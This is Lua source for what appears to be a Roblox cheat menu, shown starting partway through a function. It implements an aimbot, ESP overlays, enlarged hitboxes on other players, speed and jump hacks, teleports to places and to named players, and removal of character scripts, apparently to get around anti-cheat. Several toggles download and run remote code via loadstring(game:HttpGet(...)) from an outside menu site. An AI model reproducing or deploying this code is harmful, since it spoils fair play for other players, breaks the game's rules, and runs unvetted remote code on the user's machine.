	UserInputService.InputBegan:Connect(function(Input)
		if Input.UserInputType == Enum.UserInputType.Keyboard and Input.KeyCode == Enum.KeyCode.C then
			if AimbotTABLE.Enabled then
				if not AimbotTABLE.Target then
					AimbotTABLE.Target = GetClosestToMouse()
					if AimbotTABLE.Target then
					else
					end
				else
					AimbotTABLE.Target = nil
				end
			end
		end
	end)
	
	RunService.Heartbeat:Connect(function()
		if not AimbotTABLE.Enabled then
			return
		end
	
		if AimbotTABLE.Target then
			if typeof(CurrentCamera.CFrame.Lerp) == "function" then
				CurrentCamera.CFrame = CurrentCamera.CFrame:Lerp(CFrame.new(CurrentCamera.CFrame.Position, AimbotTABLE.Target.Position), AimbotTABLE.Smoothing)
			else
				warn("CFrame:Lerp is not a function. Check for overwriting.")
			end
		end
	end)
	
end;
task.spawn(C_d);
-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.NametagsToggle.LocalScript
local function C_14()
local script = G2L["14"];
	local button = script.Parent
	local Sense = loadstring(game:HttpGet('https://sirius.menu/sense'))()  -- Load the Sense ESP
	
	local isToggled = false
	
	-- Set initial button background color to dark gray
	button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	
	local function toggleButton()
		isToggled = not isToggled  -- Toggle the boolean value
	
		if isToggled then
			-- When toggled on: change button color to lavender
			button.BackgroundColor3 = Color3.fromRGB(164, 140, 165)  -- Button color on
	
			-- Enable the Name ESP
			Sense.teamSettings.enemy.enabled = true
			Sense.teamSettings.enemy.name = true  -- Enable name ESP
			Sense.teamSettings.enemy.nameColor = { Color3.fromRGB(255, 255, 255), 1 }  -- Set name color to white
			Sense.teamSettings.enemy.nameOutline = true  -- Enable outline for names
			Sense.teamSettings.enemy.nameOutlineColor = Color3.fromRGB(0, 0, 0)  -- Set name outline color to black
	
			print("Name ESP On, Button toggled to On")
		else
			-- When toggled off: revert button color to dark gray
			button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)  -- Button color off
	
			-- Disable the Name ESP
			Sense.teamSettings.enemy.enabled = false
			Sense.teamSettings.enemy.name = false  -- Disable name ESP
	
			print("Name ESP Off, Button toggled to Off")
		end
	end
	
	-- Connect the toggleButton function to the button click event
	button.MouseButton1Click:Connect(toggleButton)
	
	-- Load Sense ESP initially (if you want it to work immediately)
	Sense.Load()
	
	-- You can add the unloading of Sense if needed (but it's optional)
	-- Example: Sense.Unload()
	
end;
task.spawn(C_14);
-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.BoxEspToggle.LocalScript
local function C_17()
local script = G2L["17"];
	local button = script.Parent
	local Sense = loadstring(game:HttpGet('https://sirius.menu/sense'))()
	
	local isToggled = false
	
	button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	
	local function toggleButton()
		isToggled = not isToggled  
	
		if isToggled then
	
			button.BackgroundColor3 = Color3.fromRGB(164, 140, 165) 
	
			Sense.teamSettings.enemy.enabled = true
			Sense.teamSettings.enemy.box = true
			Sense.teamSettings.enemy.boxColor[1] = Color3.fromRGB(255, 255, 255)  
			Sense.teamSettings.enemy.boxFill = false  
	
	
			Sense.teamSettings.enemy.healthBar = true
			Sense.teamSettings.enemy.healthyColor = Color3.fromRGB(0, 255, 0)  
			Sense.teamSettings.enemy.dyingColor = Color3.fromRGB(255, 0, 0)  
	
			print("ESP On, Button toggled to On")
		else
	
			button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)  
	
	
			Sense.teamSettings.enemy.enabled = false
			Sense.teamSettings.enemy.box = false
			Sense.teamSettings.enemy.healthBar = false
	
			print("ESP Off, Button toggled to Off")
		end
	end
	
	button.MouseButton1Click:Connect(toggleButton)
	
	Sense.Load()
	
	
end;
task.spawn(C_17);
-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.GunchamsToggle.LocalScript
local function C_19()
local script = G2L["19"];
	local gunchamsbutton=script.Parent
	local isToggled=false
	local run=game:GetService('RunService')
	local connection
	local originalProperties={}
	gunchamsbutton.BackgroundColor3=Color3.fromRGB(31,31,31)
	if not game:IsLoaded()then game.Loaded:Wait()else print("Game loaded")end
	local function getgun()
		for i,v in pairs(game:GetService('Players').LocalPlayer.Character:GetChildren())do
			if v and v:FindFirstChild('Default')then return v end
		end
	end
	local function color(v)
		if not originalProperties[v]then
			originalProperties[v]={Color=v.Color,Material=v.Material}
		end
		v.Color=Color3.fromRGB(164,140,165)
		v.Material=Enum.Material.ForceField
	end
	local function restore(v)
		if originalProperties[v]then
			v.Color=originalProperties[v].Color
			v.Material=originalProperties[v].Material
			originalProperties[v]=nil
		end
	end
	local function togglegunchamsbutton()
		isToggled=not isToggled
		if isToggled then
			gunchamsbutton.BackgroundColor3=Color3.fromRGB(164,140,165)
			connection=run.Stepped:Connect(function()
				local gun=getgun()
				if gun then
					for i,v in pairs(gun:GetChildren())do
						if v:IsA("BasePart")then color(v)end
					end
				end
			end)
		else
			gunchamsbutton.BackgroundColor3=Color3.fromRGB(31,31,31)
			if connection then connection:Disconnect()connection=nil end
			local gun=getgun()
			if gun then
				for i,v in pairs(gun:GetChildren())do
					if v:IsA("BasePart")then restore(v)end
				end
			end
		end
	end
	gunchamsbutton.MouseButton1Click:Connect(togglegunchamsbutton)
	-- sorry nega
end;
task.spawn(C_19);
-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.ChatlogsToggle.LocalScript
local function C_1c()
local script = G2L["1c"];
	local button = script.Parent
	
	local isToggled = false
	
	button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)  -- Set initial color to dark gray
	
	local function toggleButton()
		isToggled = not isToggled  -- Toggle the boolean value
	
		if isToggled then
			button.BackgroundColor3 = Color3.fromRGB(164, 140, 165)  -- Set color to green (or any color when toggled on)
			local ChatLogs = true
	
			if game.PlaceId == 2788229376 then
				if ChatLogs == true then
					game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
					game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
				end
	
				if ChatLogs == false then
					game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = UDim2.new(0, 0, 0, 0)
					game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = false
				end
			end
		else
			button.BackgroundColor3 = Color3.fromRGB(31, 31, 31) 
			game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = false
		end
	end
	
	button.MouseButton1Click:Connect(toggleButton)
	
end;
task.spawn(C_1c);
-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.CTRLClickTP.LocalScript
local function C_20()
local script = G2L["20"];
	local Plr = game:GetService("Players").LocalPlayer
	local Mouse = Plr:GetMouse()
	
	local button = script.Parent
	local isToggled = false
	
	button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	
	local function toggleButton()
		isToggled = not isToggled
	
		if isToggled then
			button.BackgroundColor3 = Color3.fromRGB(164, 140, 165)
			print("On")
		else
			button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
			print("Off")
		end
	end
	
	button.MouseButton1Click:Connect(toggleButton)
	
	Mouse.Button1Down:connect(function()
		if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then return end
		if not Mouse.Target then return end
		if not isToggled then return end
		Plr.Character:MoveTo(Mouse.Hit.p)
	end)
	
end;
task.spawn(C_20);
-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.InfiniteJumpToggle.LocalScript
local function C_22()
local script = G2L["22"];
	local Player = game:GetService("Players").LocalPlayer
	local UIS = game:GetService("UserInputService")
	local button = script.Parent
	
	local isToggled = false
	local jumpHeight = 50  -- You can adjust this value as needed
	
	-- Set the initial button color
	button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	
	-- Function to toggle the button and jump functionality
	local function toggleButton()
		isToggled = not isToggled  -- Toggle the state
	
		if isToggled then
			button.BackgroundColor3 = Color3.fromRGB(164, 140, 165)  -- Active color
		else
			button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)  -- Inactive color
		end
	end
	
	-- Connect the button click event to the toggle function
	button.MouseButton1Click:Connect(toggleButton)
	
	-- Function to adjust the jump height based on button toggle
	UIS.InputBegan:Connect(function(UserInput)
		if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
			-- Only modify jump behavior if the button is toggled on
			if isToggled then
				-- Ensure the character and humanoid exist
				if Player.Character and Player.Character:FindFirstChild("Humanoid") then
					local humanoid = Player.Character.Humanoid
					if humanoid:GetState() == Enum.HumanoidStateType.Jumping or humanoid:GetState() == Enum.HumanoidStateType.Freefall then
						local humanoidRootPart = Player.Character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Velocity = Vector3.new(0, jumpHeight, 0)  -- Adjust the jump velocity
						end
					end
				end
			end
		end
	end)
	
end;
task.spawn(C_22);
-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.SpeedToggle.LocalScript
local function C_24()
local script = G2L["24"];
	-- Define variables
	local namebutton = script.Parent
	local istoggled = false
	local UserInputService = game:GetService("UserInputService")
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	
	-- Player and mouse references
	local Client = Players.LocalPlayer
	local Mouse = Client:GetMouse()
	
	-- Global configurations
	getgenv().keybind = "Z"
	getgenv().speeding = 700
	getgenv().cframespeedtoggle = false
	getgenv().speedvalue = 50
	
	-- Initial button color
	namebutton.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	
	-- Toggle button function
	local function togglenamebutton()
		istoggled = not istoggled
	
		if istoggled then
			namebutton.BackgroundColor3 = Color3.fromRGB(164, 140, 165)
		else
			namebutton.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
			getgenv().cframespeedtoggle = false -- Disable CFrame speed when the button is toggled off
		end
	end
	
	namebutton.MouseButton1Click:Connect(togglenamebutton)
	
	-- Speed toggle logic
	local isSpeeding = false
	Mouse.KeyDown:Connect(function(key)
		if istoggled and key:lower() == getgenv().keybind:lower() then
			isSpeeding = not isSpeeding
	
			local character = Client.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.WalkSpeed = isSpeeding and getgenv().speeding or 20
	
					humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
						humanoid.WalkSpeed = isSpeeding and getgenv().speeding or 20
					end)
				end
			end
		end
	end)
	
	-- Character scripts cleanup
	for _, v in pairs(Client.Character:GetChildren()) do
		if v:IsA("Script") and v.Name ~= "Health" and v.Name ~= "Sound" and v:FindFirstChild("LocalScript") then
			v:Destroy()
		end
	end
	
	-- Handle new character additions
	Client.CharacterAdded:Connect(function(char)
		repeat wait() until Client.Character
	
		char.ChildAdded:Connect(function(child)
			if child:IsA("Script") then
				wait(0.1)
				if child:FindFirstChild("LocalScript") then
					child.LocalScript:FireServer()
				end
			end
		end)
	end)
	
	-- CFrame speed logic
	RunService.Heartbeat:Connect(function()
		if getgenv().cframespeedtoggle and istoggled then
			local character = Client.Character
			if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") then
				character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame +
					character.Humanoid.MoveDirection * getgenv().speedvalue / 0.5
			end
		end
	end)
	
end;
task.spawn(C_24);
-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.OldSpeed.LocalScript
local function C_2a()
local script = G2L["2a"];
	local namebutton = script.Parent
	local istoggled = false
	
	namebutton.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	
	getgenv().cframespeedtoggle = false
	KeyBind = "z"  
	getgenv().speedvalue = 3
	
	local function togglenamebutton()
		istoggled = not istoggled
	
		if istoggled then
			namebutton.BackgroundColor3 = Color3.fromRGB(164, 140, 165)
		else
			namebutton.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
			getgenv().cframespeedtoggle = false
		end
	end
	
	namebutton.MouseButton1Click:Connect(togglenamebutton)
	
	local UserInputService = game:GetService("UserInputService")
	
	UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end 
	
		if input.KeyCode == Enum.KeyCode[KeyBind:upper()] and not getgenv().flytoggle then
			if istoggled then
				getgenv().cframespeedtoggle = not getgenv().cframespeedtoggle
			end
		end
	end)
	
	for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA("Script") and v.Name ~= "Health" and v.Name ~= "Sound" and v:FindFirstChild("LocalScript") then
			v:Destroy()
		end
	end
	
	game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
		repeat
			wait()
		until game.Players.LocalPlayer.Character
		char.ChildAdded:Connect(function(child)
			if child:IsA("Script") then
				wait(0.1)
				if child:FindFirstChild("LocalScript") then
					child.LocalScript:FireServer()
				end
			end
		end)
	end)
	
	game:GetService("RunService").Heartbeat:Connect(
		function()
			if getgenv().cframespeedtoggle == true then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame +
					game.Players.LocalPlayer.Character.Humanoid.MoveDirection * getgenv().speedvalue / 0.5
			end
		end
	)
end;
task.spawn(C_2a);
-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.HitBoxToggle.LocalScript
local function C_2f()
local script = G2L["2f"];
	local button = script.Parent
	local config = button.Parent:FindFirstChild("config")
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	-- Ensure child elements exist
	local configFrameBoxes = config and config:FindFirstChild("main")
	local configTxtBoxForBoxSize = configFrameBoxes and configFrameBoxes:FindFirstChild("3hitbox")
	local displayHitboxSize = configFrameBoxes and configFrameBoxes:FindFirstChild("4size")
	local configTxtBoxForBoxColor = configFrameBoxes and configFrameBoxes:FindFirstChild("1color")
	local displayHitboxColor = configFrameBoxes and configFrameBoxes:FindFirstChild("2ctext")
	local configSaveBtn = configFrameBoxes and configFrameBoxes:FindFirstChild("5save")
	
	local isToggled = false
	local hitboxLoop
	local originalHumanoidRootPartSize = Vector3.new(2, 2, 1) -- Default size of HumanoidRootPart (adjust as needed)
	
	-- Notify function for displaying notifications
	local function notify(message, duration)
		duration = duration or 2 -- Default to 2 seconds if not provided
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Notification",
			Text = message,
			Icon = "",
			Duration = duration
		})
	end
	
	-- Initial UI and settings
	button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	if config then
		config.Visible = false
	end
	
	getgenv().HitboxExpander = false
	getgenv().HitboxSize = 10
	getgenv().HitboxRefreshTime = 0.65
	getgenv().HitboxColor = Color3.fromRGB(192, 163, 193)
	
	-- Converts hex color codes to Color3
	local function hexToColor3(hex)
		hex = hex:gsub("#", "")
		if #hex == 6 then
			local r = tonumber(hex:sub(1, 2), 16)
			local g = tonumber(hex:sub(3, 4), 16)
			local b = tonumber(hex:sub(5, 6), 16)
			return Color3.fromRGB(r, g, b)
		else
			warn("Invalid Hex Code")
			return nil
		end
	end
	
	-- Clears hitbox effects from a player's character
	local function clearHitboxEffects(player)
		if player.Character then
			local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
			if rootPart then
				-- Remove hitbox visual effects
				for _, child in pairs(rootPart:GetChildren()) do
					if child:IsA("BoxHandleAdornment") or child:IsA("SelectionBox") then
						child:Destroy()
					end
				end
				-- Restore original size and collision
				rootPart.CanCollide = true
				rootPart.Size = originalHumanoidRootPartSize
			end
		end
	end
	
	-- Applies hitbox effects to a player's character
	local function applyHitboxEffects(player)
		if player.Character then
			local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
			if rootPart then
				clearHitboxEffects(player) -- Ensure any previous hitboxes are cleared
	
				-- Disable collision and resize root part for hitbox
				rootPart.CanCollide = false
				rootPart.Size = Vector3.new(getgenv().HitboxSize, getgenv().HitboxSize, getgenv().HitboxSize)
	
				-- Create visual hitbox outline
				local outline = Instance.new("BoxHandleAdornment")
				outline.Name = "HitboxOutline"
				outline.Adornee = rootPart
				outline.Size = rootPart.Size
				outline.Color3 = getgenv().HitboxColor
				outline.Transparency = 0.9
				outline.AlwaysOnTop = true
				outline.Parent = rootPart
	
				-- Create forcefield visual effect
				local forcefieldEffect = Instance.new("SelectionBox")
				forcefieldEffect.Name = "ForcefieldEffect"
				forcefieldEffect.Adornee = rootPart
				forcefieldEffect.LineThickness = 0.02
				forcefieldEffect.Color3 = getgenv().HitboxColor
				forcefieldEffect.Transparency = 0.3
				forcefieldEffect.Parent = rootPart
			end
		end
	end
	
	-- Updates settings from the UI and applies them
	local function updateSettings()
		if configTxtBoxForBoxSize and configTxtBoxForBoxColor and displayHitboxSize and displayHitboxColor then
			local boxSizeInput = tonumber(configTxtBoxForBoxSize.Text)
			local boxColorInput = configTxtBoxForBoxColor.Text
	
			if boxSizeInput and boxSizeInput > 0 then
				getgenv().HitboxSize = boxSizeInput
				displayHitboxSize.Text = "Size: " .. tostring(boxSizeInput)
			else
				warn("Invalid Box Size input. Keeping default value: " .. getgenv().HitboxSize)
			end
	
			local newColor = hexToColor3(boxColorInput)
			if newColor then
				getgenv().HitboxColor = newColor
				displayHitboxColor.Text = "Color: " .. boxColorInput
			else
				warn("Invalid Hex Color input. Keeping default color.")
			end
		end
	
		if isToggled then
			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= LocalPlayer then
					clearHitboxEffects(player)
					applyHitboxEffects(player)
				end
			end
		end
	end
	
	-- Starts the hitbox loop
	local function startHitboxLoop()
		hitboxLoop = task.spawn(function()
			while getgenv().HitboxExpander do
				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= LocalPlayer then
						applyHitboxEffects(player)
					end
				end
				task.wait(getgenv().HitboxRefreshTime)
			end
		end)
	end
	
	-- Stops the hitbox loop
	local function stopHitboxLoop()
		if hitboxLoop then
			task.cancel(hitboxLoop)
			hitboxLoop = nil
		end
	
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				clearHitboxEffects(player)
			end
		end
	end
	
	-- Toggles the hitbox expander and UI visibility
	local function toggleButton()
		isToggled = not isToggled
		getgenv().HitboxExpander = isToggled
	
		if isToggled then
			print("Hitbox Expander ON")
			button.BackgroundColor3 = Color3.fromRGB(164, 140, 165)
			if config then
				config.Visible = true
			end
	
			startHitboxLoop()
		else
			print("Hitbox Expander OFF")
			button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
			if config then
				config.Visible = false
			end
	
			stopHitboxLoop()  -- Ensure hitbox loop is stopped
			getgenv().HitboxExpander = false  -- Explicitly turn off the hitbox expander
			-- Clear hitbox effects and reset collision for all players when toggled off
			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= LocalPlayer then
					clearHitboxEffects(player)
				end
			end
		end
	end
	
	-- Connect events
	if configSaveBtn then
		configSaveBtn.MouseButton1Click:Connect(updateSettings)
	else
		warn("Save Button not found!")
	end
	
	button.MouseButton1Click:Connect(toggleButton)
	
end;
task.spawn(C_2f);
-- StarterGui.MNSGUI.MainNitroFrame.LocalScript
local function C_3d()
local script = G2L["3d"];
	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	local UserInputService = game:GetService("UserInputService")
	
	local LocalPlayer = Players.LocalPlayer
	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
	local mnsgui = PlayerGui:WaitForChild("MNSGUI")
	local MNF = mnsgui:WaitForChild("MainNitroFrame")
	
	-- Enable dragging for the frame
	MNF.Draggable = true
	MNF.Active = true
	
	-- Tween settings
	local fadeInTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local fadeOutTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
	
	local function fadeIn(frame)
		local tween = TweenService:Create(frame, fadeInTweenInfo, {BackgroundTransparency = 0})
		tween:Play()
		frame.Visible = true
	end
	
	local function fadeOut(frame)
		local tween = TweenService:Create(frame, fadeOutTweenInfo, {BackgroundTransparency = 1})
		tween:Play()
		tween.Completed:Wait()
		frame.Visible = false
	end
	
	-- Toggle visibility with the Insert key
	local isMenuVisible = true
	
	UserInputService.InputBegan:Connect(function(input, isProcessed)
		if isProcessed then return end -- Prevent interference with other input handling
	
		if input.KeyCode == Enum.KeyCode.RightShift then
			if isMenuVisible then
				MNF.Visible = true
	
			else
				MNF.Visible = false
	
			end
			isMenuVisible = not isMenuVisible
		end
	end)
	
	-- Initialize the frame as visible
	MNF.BackgroundTransparency = 0
	MNF.Visible = true
	
	
end;
task.spawn(C_3d);
-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.LocalScript
local function C_4b()
local script = G2L["4b"];
	local tplocations = {
		bank = Vector3.new(-480, 23, -285),
		school = Vector3.new(-532, 21, 336),
		hairsalon = Vector3.new(-858, 22, -652),
		gym = Vector3.new(-79, 22, -632),
		hoodkicks = Vector3.new(-240, 21, -413),
		uphill = Vector3.new(481, 47, -572),
		downhill = Vector3.new(-535, 7, -735),
		uphillfood = Vector3.new(588, 51, -480),
		food = Vector3.new(-335, 23, -295),
		revolver = Vector3.new(-635, 21, -131),
		gastation = Vector3.new(592, 48, -257),
		park = Vector3.new(-262, 22, -761),
		mil = Vector3.new(38, 25, -875),
	}
	
	local players = game:GetService("Players")
	local localPlayer = players.LocalPlayer
	local frame = script.Parent
	
	local function onButtonClicked(button)
		local locationName = button.Name:lower() 
	
		if tplocations[locationName] then
			localPlayer.Character:SetPrimaryPartCFrame(CFrame.new(tplocations[locationName]))
		else
			localPlayer:SendNotification({
				Title = "Invalid Location",
				Text = "The location doesn't exist.",
				Duration = 3
			})
		end
	end
	
	local function setupTeleportButtons()
		for _, child in pairs(frame:GetChildren()) do
			if child:IsA("TextButton") or child:IsA("ImageButton") then
				child.MouseButton1Click:Connect(function()
					onButtonClicked(child)
				end)
			end
		end
	end
	
	return setupTeleportButtons()
	
end;
task.spawn(C_4b);
-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr.LocalScript
local function C_58()
local script = G2L["58"];
	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer
	local frame = script.Parent  -- Assuming the frame containing UI elements is the parent of the script
	
	local playerNameTextbox = frame.plrName  -- TextBox for player name input
	local teleportButton = frame.tp  -- Button to trigger teleportation
	
	-- Function to find a player by nickname or username
	local function findPlayerByNameOrNickname(name)
	    for _, player in ipairs(Players:GetPlayers()) do
	        if player.Name:lower() == name:lower() or player.DisplayName:lower() == name:lower() then
	            return player
	        end
	    end
	    return nil
	end
	
	-- Function to teleport to another player by name or nickname
	local function teleportToPlayer(targetPlayerName)
	    if not localPlayer.Character or not localPlayer.Character:FindFirstChild("HumanoidRootPart") then
	        warn("Local player is not ready to teleport.")
	        return
	    end
	
	    local targetPlayer = findPlayerByNameOrNickname(targetPlayerName)
	    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
	        local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
	        localPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
	        print("Teleported to player:", targetPlayerName)
	    else
	        warn("Player not found or not ready for teleportation.")
	    end
	end
	
	-- Connect the teleport button click event
	teleportButton.MouseButton1Click:Connect(function()
	    local targetPlayerName = playerNameTextbox.Text
	    if targetPlayerName and targetPlayerName ~= "" then
	        teleportToPlayer(targetPlayerName)
	    else
	        warn("Please enter a valid player name or nickname.")
	    end
	end)
	
end;
task.spawn(C_58);
-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.tpPlr.LocalScript
local function C_59()
local script = G2L["59"];
	local tpPlrFrame = script.Parent  -- Assuming script is inside the tpPlr frame
	local plrNameTextBox = tpPlrFrame:WaitForChild("plrName")
	local tpButton = tpPlrFrame:WaitForChild("tpButton")
	
	local Players = game:GetService("Players")
	
	-- Function to find the closest matching player by partial username/display name
	local function findMatchingPlayer(partialName)
		local matchingPlayer = nil
		local bestMatchLength = math.huge
	
		for _, player in ipairs(Players:GetPlayers()) do
			-- Check if the partial name matches either the player's username or display name
			local username = player.Name:lower()
			local displayName = player.DisplayName:lower()
			partialName = partialName:lower()
	
			-- If the partial name matches a part of either the username or display name
			if username:find(partialName) or displayName:find(partialName) then
				local matchLength = math.min(#username, #displayName)
				if matchLength < bestMatchLength then
					bestMatchLength = matchLength
					matchingPlayer = player
				end
			end
		end
	
		return matchingPlayer
	end
	
	-- Listen for changes in the textbox to autofill the rest of the name
	plrNameTextBox:GetPropertyChangedSignal("Text"):Connect(function()
		local partialName = plrNameTextBox.Text
		local matchingPlayer = findMatchingPlayer(partialName)
	
		-- If a matching player is found, update the textbox with their full username or display name
		if matchingPlayer then
			plrNameTextBox.Text = matchingPlayer.Name  -- or matchingPlayer.DisplayName for display name
		end
	end)
	
	-- When the teleport button is clicked
	tpButton.MouseButton1Click:Connect(function()
		local playerName = plrNameTextBox.Text
		local targetPlayer = findMatchingPlayer(playerName)
	
		if targetPlayer then
			-- Teleport the local player to the target player
			local localPlayer = Players.LocalPlayer
			local character = localPlayer.Character
	
			if character and targetPlayer.Character then
				local targetPosition = targetPlayer.Character:WaitForChild("HumanoidRootPart").Position
				character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
			end
		else
			-- Optionally, notify the player if no valid player was found
			warn("Player not found!")
		end
	end)
	
end;
task.spawn(C_59);

return G2L["1"], require;
